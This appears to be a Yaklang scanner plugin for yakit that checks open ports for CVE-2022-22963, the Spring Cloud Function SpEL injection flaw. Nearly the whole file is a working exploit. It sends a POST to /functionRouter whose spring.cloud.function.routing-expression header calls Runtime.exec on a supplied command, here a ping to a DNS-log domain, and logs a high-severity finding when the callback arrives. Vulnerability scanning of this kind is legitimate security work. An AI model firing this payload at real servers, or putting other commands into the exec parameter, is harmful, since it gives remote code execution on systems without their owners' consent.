# port scan plugin
yakit.AutoInitYakit()
//Spring_Cloud_CVE-2022-22963_poc.yak
//默认调用portscan扫描
handleCheck = func(target,port,command,token){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `POST /functionRouter HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("{{params(command)}}")
Content-Type: text/plain
Content-Length: 4

123
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"command":command,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            yakit.Info("%v found Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞", addr)
            println(dnsdata)
            risk.NewRisk(
            addr,risk.title("CVE-2022-22963"),
            risk.severity("high"),
            risk.titleVerbose("Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）漏洞"),
            risk.type("rce[Confluence]"),
            risk.payload(`spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("dnslog")`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    server, token, err = risk.NewDNSLogDomain()
    command = str.f("ping -c 2 %v", server)
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port,command,token)
    }
    
}
